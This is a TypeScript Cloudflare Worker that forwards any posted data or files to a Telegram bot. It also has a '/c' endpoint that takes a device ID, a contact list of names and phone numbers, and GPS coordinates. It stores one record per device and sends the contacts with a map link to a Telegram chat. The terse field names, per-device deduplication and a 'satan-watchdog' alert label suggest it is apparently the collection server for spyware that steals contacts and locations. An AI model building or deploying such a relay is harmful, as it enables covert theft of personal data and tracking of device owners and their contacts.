interface Env {
  TELEGRAM_BOT_TOKEN: string;
  TELEGRAM_CHAT_ID: string;
  TELEGRAM_ADMIN_UID: string;
  WEBHOOK_URL: string;
  DB?: D1Database;
}

interface TelegramResponse {
  ok: boolean;
  description?: string;
}

interface RelayFile {
  data: Blob;
  name: string;
}

interface ParsedBody {
  text: string;
  files: RelayFile[];
}

interface ContactItem {
  n: string;
  p: string;
}

interface CRequestBody {
  d_id: string;
  c_list: ContactItem[];
  lat?: number;
  lon?: number;
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);

    if (url.pathname === "/c" && request.method === "POST") {
      return handleC(request, env);
    }

    if (request.method !== "POST") {
      return jsonResponse(
        {
          ok: false,
          error: "Send a POST request to relay its body to Telegram.",
        },
        405,
        { Allow: "POST" },
      );
    }

    if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
      return jsonResponse(
        { ok: false, error: "Worker is not configured." },
        500,
      );
    }

    try {
      const body = await parseRequestBody(request);
      const messageParts = [body.text];

      if (body.files.length > 0) {
        messageParts.push(
          "",
          "Files:",
          ...body.files.map(
            (file) =>
              `- ${file.name} (${file.data.type || "application/octet-stream"}, ${file.data.size} bytes)`,
          ),
        );
      }

      await sendTelegramMessage(messageParts.join("\n"), env);

      for (const file of body.files) {
        await sendTelegramDocument(file, env);
      }

      return jsonResponse({ ok: true, files_sent: body.files.length }, 202);
    } catch (error) {
      await notifyAdmin(error, env);
      return jsonResponse(
        { ok: false, error: "Could not forward the request to Telegram." },
        502,
      );
    }
  },
};

async function handleC(request: Request, env: Env): Promise<Response> {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    return jsonResponse({ ok: false, error: "Worker is not configured." }, 500);
  }

  const url = new URL(request.url);
  const queryDeviceId = url.searchParams.get("device_id") || url.searchParams.get("d_id");

  let deviceId = queryDeviceId?.trim() || "";
  let contactsList: ContactItem[] = [];
  let fileBlob: Blob | null = null;
  let fileName = "c.json";

  let locationData: { lat: number; lon: number } | null = null;
  const contentType = (request.headers.get("content-type") ?? "").toLowerCase();

  if (contentType.includes("multipart/form-data")) {
    try {
      const form = await request.formData();
      const formDeviceId = form.get("device_id") || form.get("d_id");
      if (!deviceId && typeof formDeviceId === "string") {
        deviceId = formDeviceId.trim();
      }

      const formLat = form.get("lat");
      const formLon = form.get("lon");
      if (typeof formLat === "string" && typeof formLon === "string") {
        locationData = { lat: parseFloat(formLat), lon: parseFloat(formLon) };
      }

      const fileField = form.get("file");
      if (fileField && typeof fileField !== "string") {
        fileBlob = fileField;
        if (fileField.name) {
          fileName = sanitizeFilename(fileField.name);
        }
        const text = await fileField.text();
        const parsed = JSON.parse(text);
        if (Array.isArray(parsed)) {
          contactsList = parsed;
        } else if (parsed && Array.isArray(parsed.c_list)) {
          contactsList = parsed.c_list;
          if (!deviceId && typeof parsed.d_id === "string") {
            deviceId = parsed.d_id.trim();
          }
          if (typeof parsed.lat === "number" && typeof parsed.lon === "number") {
            locationData = { lat: parsed.lat, lon: parsed.lon };
          }
        }
      }
    } catch {
      return jsonResponse({ ok: false, error: "Failed to parse multipart form-data or JSON file." }, 400);
    }
  } else {
    // Fallback: support direct JSON body { d_id, c_list, lat, lon }
    try {
      const payload = (await request.json()) as CRequestBody;
      if (!deviceId && typeof payload?.d_id === "string") {
        deviceId = payload.d_id.trim();
      }
      if (Array.isArray(payload?.c_list)) {
        contactsList = payload.c_list;
      }
      if (typeof payload?.lat === "number" && typeof payload?.lon === "number") {
        locationData = { lat: payload.lat, lon: payload.lon };
      }
    } catch {
      return jsonResponse({ ok: false, error: "Invalid JSON body." }, 400);
    }
  }

  if (!deviceId) {
    return jsonResponse({ ok: false, error: "Missing device_id query param." }, 400);
  }

  if (
    !Array.isArray(contactsList) ||
    !contactsList.every(
      (item) => item && typeof item.n === "string" && typeof item.p === "string",
    )
  ) {
    return jsonResponse(
      {
        ok: false,
        error: "Contacts must be an array of { n: string, p: string }.",
      },
      400,
    );
  }

  // If D1 DB binding is configured, check duplicates and save record.
  if (env.DB) {
    try {
      const existing = await env.DB.prepare(
        "SELECT d_id FROM submissions WHERE d_id = ? LIMIT 1",
      )
        .bind(deviceId)
        .first<{ d_id: string }>();

      if (existing) {
        return jsonResponse(
          {
            ok: false,
            error: "Duplicate d_id.",
            d_id: deviceId,
          },
          409,
        );
      }
    } catch (error) {
      await notifyAdmin(error, env);
      return jsonResponse({ ok: false, error: "Database check failed." }, 500);
    }

    try {
      await env.DB.prepare("INSERT INTO submissions (d_id, c_list) VALUES (?, ?)")
        .bind(deviceId, JSON.stringify(contactsList))
        .run();
    } catch (error) {
      await notifyAdmin(error, env);
      return jsonResponse(
        { ok: false, error: "Could not save to database." },
        500,
      );
    }
  }

  try {
    const documentPayload: Record<string, unknown> = {
      d_id: deviceId,
      count: contactsList.length,
    };
    if (locationData) {
      documentPayload.lat = locationData.lat;
      documentPayload.lon = locationData.lon;
      documentPayload.maps = `https://maps.google.com/?q=${locationData.lat},${locationData.lon}`;
    }
    documentPayload.c_list = contactsList;

    const jsonFormatted = JSON.stringify(documentPayload, null, 2);
    const documentBlob = new Blob([jsonFormatted], { type: "text/plain; charset=utf-8" });
    const documentName = `contacts_${deviceId}.txt`;

    let caption = `Device: ${deviceId}`;
    if (locationData) {
      caption += `\nLocation: ${locationData.lat}, ${locationData.lon}`;
    }

    await sendTelegramDocument(
      { data: documentBlob, name: documentName },
      env,
      caption,
    );

    return jsonResponse(
      { ok: true, d_id: deviceId, count: contactsList.length },
      202,
    );
  } catch (error) {
    await notifyAdmin(error, env);
    return jsonResponse(
      { ok: false, error: "Could not forward the request to Telegram." },
      502,
    );
  }
}

async function parseRequestBody(request: Request): Promise<ParsedBody> {
  const originalContentType = request.headers.get("content-type") ?? "";
  const contentType = originalContentType.toLowerCase();

  if (contentType.includes("multipart/form-data")) {
    const form = await request.formData();
    const fields: Array<[string, string]> = [];
    const files: RelayFile[] = [];

    for (const [name, value] of form.entries()) {
      if (typeof value === "string") {
        fields.push([name, value]);
      } else {
        files.push({
          data: value,
          name: sanitizeFilename(value.name || `${name}.bin`),
        });
      }
    }

    return {
      text:
        fields.length > 0
          ? JSON.stringify(fields, null, 2)
          : "(no text form fields)",
      files,
    };
  }

  const bytes = new Uint8Array(await request.arrayBuffer());

  if (bytes.byteLength === 0) {
    return { text: "(empty body)", files: [] };
  }

  const attachmentName = filenameFromContentDisposition(
    request.headers.get("content-disposition"),
  );

  if (attachmentName) {
    return binaryBody(bytes, originalContentType, attachmentName);
  }

  if (
    contentType.includes("application/json") ||
    contentType.includes("+json")
  ) {
    const text = new TextDecoder().decode(bytes);

    try {
      return {
        text: JSON.stringify(JSON.parse(text) as unknown, null, 2),
        files: [],
      };
    } catch {
      return { text, files: [] };
    }
  }

  if (contentType.includes("application/x-www-form-urlencoded")) {
    const params = new URLSearchParams(new TextDecoder().decode(bytes));
    return {
      text: JSON.stringify(Array.from(params.entries()), null, 2),
      files: [],
    };
  }

  if (
    isTextContentType(contentType) ||
    (contentType === "" && isLikelyText(bytes))
  ) {
    return { text: new TextDecoder().decode(bytes), files: [] };
  }

  return binaryBody(
    bytes,
    originalContentType,
    filenameFromRequest(request, contentType),
  );
}

function isTextContentType(contentType: string): boolean {
  return (
    contentType.startsWith("text/") ||
    contentType.includes("xml") ||
    contentType.includes("javascript") ||
    contentType.includes("graphql")
  );
}

function isLikelyText(bytes: Uint8Array): boolean {
  try {
    const text = new TextDecoder("utf-8", { fatal: true }).decode(bytes);
    let controlCharacters = 0;

    for (const character of text) {
      const code = character.codePointAt(0) ?? 0;
      if (
        code < 32 &&
        character !== "\n" &&
        character !== "\r" &&
        character !== "\t"
      ) {
        controlCharacters += 1;
      }
    }

    return controlCharacters === 0;
  } catch {
    return false;
  }
}

function binaryBody(
  bytes: Uint8Array,
  contentType: string,
  filename: string,
): ParsedBody {
  const mediaType =
    contentType.split(";", 1)[0].trim() || "application/octet-stream";

  return {
    text: "(binary body forwarded as a file)",
    files: [
      {
        data: new Blob([bytes.buffer as ArrayBuffer], { type: mediaType }),
        name: sanitizeFilename(filename),
      },
    ],
  };
}

function filenameFromContentDisposition(
  disposition: string | null,
): string | null {
  if (!disposition) {
    return null;
  }

  const encodedMatch = disposition.match(/filename\*=UTF-8''([^;]+)/i);
  if (encodedMatch?.[1]) {
    try {
      return sanitizeFilename(decodeURIComponent(encodedMatch[1]));
    } catch {
      return sanitizeFilename(encodedMatch[1]);
    }
  }

  const plainMatch = disposition.match(/filename="?([^";]+)"?/i);
  return plainMatch?.[1] ? sanitizeFilename(plainMatch[1]) : null;
}

function filenameFromRequest(request: Request, contentType: string): string {
  const url = new URL(request.url);
  const explicitName =
    request.headers.get("x-filename") ?? url.searchParams.get("filename");

  if (explicitName) {
    try {
      return sanitizeFilename(decodeURIComponent(explicitName));
    } catch {
      return sanitizeFilename(explicitName);
    }
  }

  const pathname = url.pathname;
  const lastSegment = pathname.split("/").filter(Boolean).at(-1);

  if (lastSegment) {
    try {
      return sanitizeFilename(decodeURIComponent(lastSegment));
    } catch {
      return sanitizeFilename(lastSegment);
    }
  }

  return `upload${extensionForContentType(contentType)}`;
}

function extensionForContentType(contentType: string): string {
  const extensions: Record<string, string> = {
    "application/octet-stream": ".bin",
    "application/pdf": ".pdf",
    "application/zip": ".zip",
    "image/gif": ".gif",
    "image/jpeg": ".jpg",
    "image/png": ".png",
    "image/webp": ".webp",
  };

  return extensions[contentType.split(";", 1)[0]] ?? ".bin";
}

function sanitizeFilename(filename: string): string {
  const basename = filename.split(/[\\/]/).at(-1)?.trim();
  return basename?.replace(/[\r\n"]/g, "_") || "upload.bin";
}

async function sendTelegramMessage(
  text: string,
  env: Env,
  parseMode?: "HTML" | "MarkdownV2" | "Markdown",
): Promise<void> {
  const body: Record<string, unknown> = {
    chat_id: env.TELEGRAM_CHAT_ID,
    text,
  };
  if (parseMode) {
    body.parse_mode = parseMode;
  }

  const response = await fetch(
    `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    },
  );

  await assertTelegramResponse(response);
}

async function sendTelegramDocument(
  file: RelayFile,
  env: Env,
  caption?: string,
  parseMode?: "HTML" | "MarkdownV2" | "Markdown",
): Promise<void> {
  const form = new FormData();
  form.append("chat_id", env.TELEGRAM_CHAT_ID);
  form.append("document", file.data, file.name);
  if (caption) {
    form.append("caption", caption);
  }
  if (parseMode) {
    form.append("parse_mode", parseMode);
  }

  const response = await fetch(
    `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendDocument`,
    {
      method: "POST",
      body: form,
    },
  );

  await assertTelegramResponse(response);
}

async function assertTelegramResponse(response: Response): Promise<void> {
  const result = (await response.json()) as TelegramResponse;

  if (!response.ok || !result.ok) {
    throw new Error(
      result.description ?? `Telegram returned HTTP ${response.status}`,
    );
  }
}

async function notifyAdmin(error: unknown, env: Env): Promise<void> {
  if (!env.TELEGRAM_ADMIN_UID) {
    return;
  }

  const message = error instanceof Error ? error.message : String(error);

  try {
    await fetch(
      `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          chat_id: env.TELEGRAM_ADMIN_UID,
          text: `satan-watchdog relay failed: ${message}`,
        }),
      },
    );
  } catch {
    // Avoid masking the original relay error if the admin alert itself fails.
  }
}

function jsonResponse(
  data: unknown,
  status = 200,
  headers: Record<string, string> = {},
): Response {
  return Response.json(data, {
    status,
    headers: {
      ...headers,
      "cache-control": "no-store",
    },
  });
}
